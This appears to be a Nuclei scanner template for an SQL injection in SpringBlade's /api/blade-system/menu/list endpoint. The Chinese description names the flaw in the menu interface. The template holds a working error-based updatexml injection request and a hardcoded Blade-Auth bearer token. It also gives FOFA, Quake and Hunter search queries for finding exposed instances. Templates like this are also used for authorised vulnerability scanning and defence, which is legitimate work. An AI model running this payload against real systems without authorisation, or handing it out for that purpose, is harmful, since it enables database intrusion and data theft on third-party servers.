id: SpringBlade_menulist_SQLi

info:
  name: SpringBlade_menulist_SQLi
  author: HK
  severity: high
  description: SpringBlade系统menu接口存在SQL注入漏洞
  metadata:
    max-request: 1
    Fofa-query: body="https://bladex.vip"
    Quake-query: body="https://bladex.vip"
    Hunter-query: body="https://bladex.vip"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /api/blade-system/menu/list?updatexml(1,concat(0x7e,md5(123456),0x7e),1)=1 HTTP/1.1
    Host: {{Hostname}}
    User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
    Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ
    Connection: close

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
      - XPATH